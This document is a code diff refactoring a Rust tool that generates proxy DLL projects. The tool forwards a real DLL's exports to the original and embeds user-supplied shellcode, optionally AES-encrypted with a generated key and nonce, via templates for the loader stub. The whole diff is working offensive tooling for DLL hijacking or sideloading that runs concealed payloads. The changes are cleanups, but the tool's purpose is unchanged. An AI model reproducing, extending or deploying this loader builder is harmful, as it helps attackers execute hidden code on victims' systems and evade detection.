@@ -32,9 +32,26 @@ struct Args {
 }
 
 fn join_vec(nums: &[u8], sep: &str) -> String {
-    let str_nums: Vec<String> = nums.iter().map(|n| n.to_string()).collect();
+    nums.iter()
+        .map(|n| n.to_string())
+        .collect::<Vec<_>>()
+        .join(sep)
+}
 
-    str_nums.join(sep)
+fn load_resource_file(resource_path: &mut std::path::PathBuf, filename: &str) -> std::io::Result<String> {
+    resource_path.push(filename);
+    let content = fs::read_to_string(&resource_path)?;
+    resource_path.pop();
+    Ok(content)
+}
+
+fn write_output_file(output_path: &mut std::path::PathBuf, filename: &str, content: &[u8]) -> std::io::Result<()> {
+    output_path.push(filename);
+    let mut file = File::create(&output_path)?;
+    file.write_all(content)?;
+    println!("Wrote {} to {:?}", filename, output_path);
+    output_path.pop();
+    Ok(())
 }
 
 fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
@@ -50,30 +67,45 @@ fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
     }
 }
 
+fn get_encryption_algo(
+    encryption: &Option<String>,
+    shellcode: &mut Vec<u8>,
+    resource_path: &mut std::path::PathBuf,
+) -> std::io::Result<String> {
+    if let Some(enc_type) = encryption {
+        if enc_type.to_lowercase() == "aes" {
+            println!("Using AES encryption");
+            let tmp_enc_algo = load_resource_file(resource_path, "aes.rs")?;
+            let enc_args = encrypt_aes(shellcode);
+            Ok(tmp_enc_algo
+                .replace("{KEY}", join_vec(&enc_args.key, ",").as_str())
+                .replace("{NONCE}", join_vec(&enc_args.nonce, ",").as_str()))
+        } else {
+            panic!("Unknown encryption algorithm");
+        }
+    } else {
+        println!("No encryption defined - embedding plain shellcode");
+        Ok(String::from("let dec_shellcode = shellcode::SHELLCODE.to_vec();"))
+    }
+}
+
 fn main() -> std::io::Result<()> {
     let args = Args::parse();
     println!("Proxying {:?}", args.dll);
 
-    let mut shellcode = if args.shellcode.is_some() {
-        let shellcode_path = args.shellcode.unwrap();
-        println!("Embedding shellcode {:?}", shellcode_path);
-        fs::read(&shellcode_path).expect("Could not read shellcode file")
-    } else {
-        println!("No shellcode argument given - skipping");
-        Default::default()
+    let mut shellcode = match &args.shellcode {
+        Some(shellcode_path) => {
+            println!("Embedding shellcode {:?}", shellcode_path);
+            fs::read(shellcode_path).expect("Could not read shellcode file")
+        }
+        None => {
+            println!("No shellcode argument given - skipping");
+            Vec::new()
+        }
     };
 
-    let mut output = if args.output.is_some() {
-        args.output.unwrap()
-    } else {
-        std::path::PathBuf::from("output")
-    };
-
-    let mut resource_path = if args.resources.is_some() {
-        args.resources.unwrap()
-    } else {
-        std::path::PathBuf::from(".\\")
-    };
+    let mut output = args.output.unwrap_or_else(|| std::path::PathBuf::from("output"));
+    let mut resource_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from(".\\."));
 
     let contents = fs::read(&args.dll).expect("Could not read dll file");
 
@@ -92,90 +124,54 @@ fn main() -> std::io::Result<()> {
         export_table.array_of_names.len()
     );
 
-    let mut function_exports = "".to_owned();
-    for i in 0..export_table.array_of_names.len() {
-        let function_export = format!(
-            "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
-            export_table.array_of_names[i],
-            file_name,
-            export_table.array_of_names[i],
-            export_table.array_of_ordinals[i]
-        );
-        function_exports.push_str(&function_export);
-    }
+    let function_exports = export_table
+        .array_of_names
+        .iter()
+        .zip(export_table.array_of_ordinals.iter())
+        .map(|(name, ordinal)| {
+            format!(
+                "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
+                name, file_name, name, ordinal
+            )
+        })
+        .collect::<String>();
 
-    resource_path.push("export.rs");
-    let content_export_asm = fs::read_to_string(&resource_path).expect("Could not read export.rs");
-    resource_path.pop();
-
+    let content_export_asm = load_resource_file(&mut resource_path, "export.rs")?;
     let export_asm = content_export_asm.replace("{}", function_exports.as_str());
 
-    resource_path.push("template.rs");
-    let contents = fs::read_to_string(&resource_path).expect("Could not read template.rs");
-    resource_path.pop();
+    let template_content = load_resource_file(&mut resource_path, "template.rs")?;
 
     fs::create_dir(&output)?;
 
-    let mut content_shellcode_stub = Default::default();
-    if shellcode.len() > 0 {
-        let enc_algo = if args.encryption.is_some() {
-            if args.encryption.unwrap().to_lowercase() == "aes" {
-                println!("Using AES encryption");
-                resource_path.push("aes.rs");
-                let tmp_enc_algo = fs::read_to_string(&resource_path).expect("Could not read aes.rs");
-                resource_path.pop();
-                let enc_args = encrypt_aes(&mut shellcode);
-                tmp_enc_algo
-                    .replace("{KEY}", join_vec(&enc_args.key, ",").as_str())
-                    .replace("{NONCE}", join_vec(&enc_args.nonce, ",").as_str())
-            } else {
-                panic!("Unkown encryption algorithm");
-            }
-        } else {
-            println!("No encryption defined - embedding plain shellcode");
-            String::from("let dec_shellcode = shellcode::SHELLCODE.to_vec();")
-        };
+    let mut content_shellcode_stub = String::new();
+    if !shellcode.is_empty() {
+        let enc_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut resource_path)?;
 
-        resource_path.push("shellcode_template.rs");
-        let content_shellcode_template =
-            fs::read_to_string(&resource_path).expect("Could not read shellcode_template.rs");
-        resource_path.pop();
-
+        let content_shellcode_template = load_resource_file(&mut resource_path, "shellcode_template.rs")?;
         let shellcode_str = join_vec(&shellcode, ",");
 
         let content_shellcode = content_shellcode_template
-            .replace("{SIZE}", shellcode.len().to_string().as_str())
-            .replace("{SHELLCODE}", shellcode_str.as_str());
+            .replace("{SIZE}", &shellcode.len().to_string())
+            .replace("{SHELLCODE}", &shellcode_str);
 
-        output.push("shellcode.rs");
-        let mut file = File::create(&output).expect("Could not create shellcode.rs");
-        file.write_all(content_shellcode.as_bytes())?;
-        println!("Wrote shellcode to {:?}", &output);
-        output.pop();
+        write_output_file(&mut output, "shellcode.rs", content_shellcode.as_bytes())?;
 
-        resource_path.push("shellcode_stub.rs");
-        content_shellcode_stub =
-            fs::read_to_string(&resource_path).expect("Could not read shellcode_stub.rs");
-        resource_path.pop();
-        content_shellcode_stub = content_shellcode_stub.replace("{ENC}", &enc_algo)
+        content_shellcode_stub = load_resource_file(&mut resource_path, "shellcode_stub.rs")?;
+        content_shellcode_stub = content_shellcode_stub.replace("{ENC}", &enc_algo);
     }
 
-    output.push("proxy.rs");
-    let mut file = File::create(&output)?;
-    file.write_all(
-        contents
-            .replace("{}", export_asm.as_str())
-            .replace("{SHELLCODE_STUB}", &content_shellcode_stub)
-            .as_bytes(),
-    )?;
-    println!("Wrote proxy dll template to {:?}", output);
-    output.pop();
+    let proxy_content = template_content
+        .replace("{}", &export_asm)
+        .replace("{SHELLCODE_STUB}", &content_shellcode_stub);
+    write_output_file(&mut output, "proxy.rs", proxy_content.as_bytes())?;
 
+    // Copy build files from resources
     output.push("build.rs");
     resource_path.push("build.rs");
     fs::copy(&resource_path, &output).expect("Could not create build.rs");
     output.pop();
     resource_path.pop();
+
     output.push("Cargo.toml");
     resource_path.push("Cargo.toml");
     fs::copy(&resource_path, &output).expect("Could not create Cargo.toml");
